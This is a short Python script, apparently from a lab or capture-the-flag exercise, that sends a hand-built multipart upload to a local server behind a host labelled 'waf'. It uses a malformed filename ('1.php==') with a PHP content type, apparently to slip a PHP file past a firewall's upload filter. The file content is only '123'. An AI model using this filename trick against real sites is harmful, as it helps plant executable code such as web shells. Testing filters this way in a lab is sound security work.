import requests

# 构造自定义的 multipart/form-data 请求体
boundary = '----WebKitFormBoundaryIABEqlYAQTic2F4P'
body = (
    f'--{boundary}\r\n'
    'Content-Disposition: form-data; name="file"; filename="1.php=="\r\n'
    'Content-Type: text/php\r\n\r\n'
    '123\r\n'
    f'--{boundary}--\r\n'
)

headers = {
    'Content-Type': f'multipart/form-data; boundary={boundary}',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'Origin': 'http://waf:9001',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Referer': 'http://waf:9001/',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,vi;q=0.7',
    'Connection': 'close'
}

# 发送 POST 请求
response = requests.post('http://localhost:9001/upload', data=body, headers=headers)

# 打印响应
print('Status Code:', response.status_code)
print('Response Text:', response.text)
